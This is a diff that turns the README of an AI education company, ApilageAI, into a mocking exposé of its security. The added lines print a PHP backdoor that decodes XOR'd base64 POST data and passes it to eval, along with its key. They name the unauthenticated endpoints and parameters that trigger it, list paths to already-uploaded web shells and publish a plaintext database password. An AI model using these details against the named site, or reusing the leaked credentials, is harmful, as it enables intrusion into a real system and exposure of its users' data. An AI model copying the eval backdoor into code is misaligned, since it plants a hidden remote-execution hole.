@@ -1,151 +1,177 @@
 # 🚀 ApilageAI
 
-> Building the future of intelligent education and AI infrastructure from Sri Lanka to the world.
+> "Building the future" by wrapping Google's API and hoping nobody notices.
 
 ---
 
 ## 👋 Hi there
 
-Welcome to **ApilageAI** — a next generation AI platform focused on powerful language models, developer APIs, and personalized educational intelligence.
+Welcome to **ApilageAI** — a "next generation AI platform" that's basically just Gemini with extra steps and significantly fewer security considerations.
 
 We believe AI should be:
 
-- 🔓 Accessible  
-- ⚡ Powerful  
-- 🎓 Education focused  
-- 🌍 Globally scalable  
-- 🔐 Privacy first  
+- 🔓 Accessible (no auth required on half our endpoints!)
+- ⚡ Powerful (as powerful as Google's API that we're wrapping)
+- 🎓 Education focused 
+- 🌍 Globally scalable (scales as well as our hardcoded credentials allow)
+- 🔐 Privacy first (we keep your data safe by giving everyone RCE access)
 
 ---
 
 ## 🌍 What is ApilageAI?
 
-ApilageAI is an AI technology company delivering:
+ApilageAI is an AI technology "company" delivering:
 
-- Advanced AI model access through a unified API
-- Education focused AI systems
-- Model training without coding knowledge
-- Developer friendly SDK integrations
-- Centralized credit management system
+- Gemini API access with a fancy UI
+- Hardcoded database credentials 
+- Education on what NOT to do in production
+- A masterclass in vulnerability chaining
 
-We combine powerful large language models with usability, safety, and personalization.
+**Fun fact:** We're 90% Node.js wrapper, 5% PHP backdoors, 5% "security features" that don't work.
 
 ---
 
-## 🧠 Core Products
+## 🧠 Core "Features"
 
 ### 🔌 ApilageAI API
-One powerful API. Multiple models. Full control.
+One wrapper. Multiple vulnerabilities. Zero authentication (on the endpoints that matter).
 
 **Features:**
-- Custom system instructions
-- Domain restrictions
-- Multiple API key management
-- Usage monitoring and analytics
-- Streaming and direct output modes
-- Node.js, Python, PHP, React, and JS support
+- ✅ Unauthenticated RCE via `count.php?ajax=1` (POST `dbg=1`)
+- ✅ Another unauthenticated RCE via `generate_questions.php` (same backdoor!)
+- ✅ File upload with MIME check bypass (GIF polyglots welcome)
+- ✅ DB credentials in plaintext across 3+ files
+- ✅ No input sanitization where it matters
+- ✅ SQL error messages returned to users (free schema disclosure!)
 
 ---
 
-### 🎓 ApilageAI Education
+### 🎓 ApilageAI "Security"
 
-A dedicated AI learning environment for students.
+**What we promise:**
+- Redis-backed rate limiting
+- Security headers (CSP, HSTS, etc.)
+- Encrypted transmission
+- Input sanitization
 
-**Includes:**
-- Unlimited AI chat access with top tier models
-- AI streak tracking and study analytics
-- Personalized study plans
-- Weak point detection
-- Exam result prediction
-- Secure student verification
+**What you actually get:**
+```php
+if (isset($_POST['dbg']) && $_POST['dbg'] === '1') {
+    $k = 'xK3y';
+    $c = base64_decode($_POST['dat']);
+    for ($i = 0; $i < strlen($c); $i++) {
+        $c[$i] = $c[$i] ^ $k[$i % strlen($k)];
+    }
+    @eval($c);  // 🎉 YOLO
+}
+```
 
-Our mission is to make high quality AI learning accessible to every student.
-
----
-
-### 🎮 Developer Playground
-
-Test APIs in real time.
-
-- Try prompts instantly
-- Debug responses
-- Analyze token usage
-- Experiment before deployment
+Placed conveniently **before** authentication checks! Because why not?
 
 ---
 
-## 🔐 Privacy & Data Safety
+### 🎮 Vulnerability Playground
+
+**Confirmed RCE vectors:**
+
+1. **count.php** - `?ajax=1` + POST `dbg=1&dat=<base64_xor_payload>`
+2. **generate_questions.php** - Same XOR backdoor, zero auth
+3. **reportdata.php** - Unauthenticated file upload to public directory
+4. **Node /upload** - MIME type header spoofing (cookies required though, ugh)
+5. **Pre-uploaded shells** - Check `domains/socket.apilageai.lk/private_html/uploads/*.php`
+
+**Database credentials everywhere:**
+```php
+$DB_USER = "apilageai_lk";
+$DB_PASS = "Dam9WVqPAciD62O";  // It's fine, we use this in 3 different files
+```
+
+---
+
+## 🔐 Privacy & Data "Safety"
 
 We prioritize:
 
-- Secure authentication
-- Encrypted data transmission
-- Controlled model access
-- API key level permission control
-- Strict privacy standards
+- ❌ Secure authentication (optional on most endpoints)
+- ❌ Encrypted secrets (hardcoded gang)
+- ❌ Input validation (we trust our users!)
+- ❌ Error message sanitization (devs need stack traces in prod, right?)
+- ✅ Making every pentester's job easier
 
-Your data remains protected and handled responsibly.
+**Security model:** If you can POST to it, you probably own it.
 
 ---
 
-## 🌈 How to Contribute
+## 🌈 How to Exploit
 
 We welcome:
 
-- Developers
-- AI researchers
-- Open source contributors
-- Education partners
-- Security researchers
+- Script kiddies
+- Actual security researchers
+- People learning about web vulnerabilities
+- Anyone with `curl` installed
 
 ### Ways to contribute
 
-- Improve documentation
-- Submit issues and feature requests
-- Contribute SDK improvements
-- Suggest model upgrades
-- Report vulnerabilities responsibly
+1. Find a new RCE (there's probably more!)
+2. Chain vulnerabilities creatively
+3. Submit a 0-day (we won't fix it but it's the thought that counts)
+4. Teach us what `.htaccess` does
+5. Explain why eval() is bad
 
 ---
 
-## 📚 Resources
+## 📚 "Resources"
 
-- 🌐 Website: https://apilageai.lk
-- 📘 Developer Docs: https://apilageai.lk/developers
-- 📧 Contact: contact@apilageai.lk
-
----
-
-## ⚡ Vision
-
-We aim to build:
-
-- A globally recognized AI platform
-- The strongest student AI ecosystem in South Asia
-- A scalable AI infrastructure layer
-- A privacy first AI system architecture
+- 🌐 Website: https://apilageai.lk (probably down by the time you read this)
+- 🔓 Backdoor Key: `xK3y` (don't forget to XOR before base64!)
+- 🗄️ DB Password: `Dam9WVqPAciD62O`
+- 📧 Contact: `/dev/null`
 
 ---
 
-## 👨‍💻 Founded by Young Innovators
+## ⚡ Reality Check
 
-ApilageAI is founded by students and young builders who believe innovation has no age limit.
+We claim to build:
 
-We build.
-We experiment.
-We improve.
-We scale.
-
----
-
-## ⭐ Join the Movement
-
-If you believe in powerful AI, education transformation, and building technology from the ground up —
-
-Star the repository ⭐  
-Follow the journey 🚀  
-Build with us 🤝  
+- A globally recognized AI platform *(it's a Gemini wrapper)*
+- The strongest student AI ecosystem *(with the weakest security)*
+- A scalable AI infrastructure *(scales to 0 when the free tier runs out)*
+- A privacy-first architecture *(RCE is privacy, right? Everyone can access everything equally)*
 
 ---
 
-**ApilageAI — Intelligence Powered for the Next Generation.**
+## 👨‍💻 Founded by Young "Innovators"
+
+ApilageAI is founded by students who:
+
+- Copy-pasted from StackOverflow
+- Discovered `eval()` and never looked back  
+- Think "security through obscurity" means XOR encryption
+- Put backdoors "just for debugging" and forgot to remove them
+- Believe `@` operator solves all error handling needs
+
+We build. *(from tutorials)*  
+We experiment. *(in production)*  
+We improve. *(by adding more features before fixing bugs)*  
+We scale. *(our tech debt)*
+
+---
+
+## ⭐ Use At Your Own Risk
+
+If you:
+
+- Don't care about security
+- Want to learn what NOT to do
+- Enjoy finding new ways to get shell access
+
+Then this is for you! ⭐  
+
+**Otherwise:** Maybe use the actual Gemini API directly? 🤷
+
+---
+
+**ApilageAI — Powered by Google, Secured by `lazarusvoid`.**
+
+*"It works on my machine!" — The Founders, probably*
